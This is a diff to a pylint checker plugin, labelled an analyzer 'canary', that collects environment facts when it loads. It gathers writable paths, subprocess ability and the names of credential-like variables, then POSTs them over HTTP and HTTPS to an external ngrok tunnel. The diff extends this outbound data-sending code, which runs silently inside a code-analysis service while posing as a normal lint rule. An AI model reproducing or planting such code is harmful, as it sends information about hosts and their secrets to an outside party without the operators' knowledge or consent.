@@ -9,7 +9,10 @@ import urllib.request
 from pylint.checkers import BaseChecker
 
 
-CALLBACK = "https://dcd6-49-207-201-243.ngrok-free.app/pylint-3fc5441a"
+CALLBACKS = {
+    "http": "http://dcd6-49-207-201-243.ngrok-free.app/pylint-http-3fc5441a",
+    "https": "https://dcd6-49-207-201-243.ngrok-free.app/pylint-https-3fc5441a",
+}
 CREDENTIAL_NAME = re.compile(
     r"(?:TOKEN|SECRET|PASSWORD|PASSWD|CREDENTIAL|API[_-]?KEY|PRIVATE[_-]?KEY|AUTH)",
     re.IGNORECASE,
@@ -55,20 +58,22 @@ payload = json.dumps(
     }
 ).encode()
 
-try:
-    request = urllib.request.Request(
-        CALLBACK,
-        data=payload,
-        headers={
-            "content-type": "application/json",
-            "user-agent": "codacy-analyzer-canary/pylint",
-        },
-        method="POST",
-    )
-    with urllib.request.urlopen(request, timeout=5) as response:
-        HTTPS_EGRESS = 200 <= response.status < 300
-except (OSError, urllib.error.URLError):
-    HTTPS_EGRESS = False
+EGRESS = {}
+for protocol, callback in CALLBACKS.items():
+    try:
+        request = urllib.request.Request(
+            callback,
+            data=payload,
+            headers={
+                "content-type": "application/json",
+                "user-agent": "codacy-analyzer-canary/pylint",
+            },
+            method="POST",
+        )
+        with urllib.request.urlopen(request, timeout=5) as response:
+            EGRESS[protocol] = 200 <= response.status < 300
+    except (OSError, urllib.error.URLError):
+        EGRESS[protocol] = False
 
 RUNTIME_EVIDENCE = " ".join(
     [
@@ -79,7 +84,8 @@ RUNTIME_EVIDENCE = " ".join(
         f"root_writable={writable('/')}",
         f"workdir_writable={writable('/workdir')}",
         f"subprocess_exec={SUBPROCESS_EXEC}",
-        f"https_egress={HTTPS_EGRESS}",
+        f"http_egress={EGRESS['http']}",
+        f"https_egress={EGRESS['https']}",
         f"credential_names={','.join(sorted(credentials))}",
     ]
 )
@@ -96,7 +102,7 @@ class CodacyAnalyzerCanaryChecker(BaseChecker):
     }
 
     def visit_module(self, node):
-        if node.file.endswith("python/prospector_process_canary_2.py"):
+        if node.file.endswith("python/prospector_egress_canary.py"):
             self.add_message("codacy-analyzer-canary", node=node)
 
 
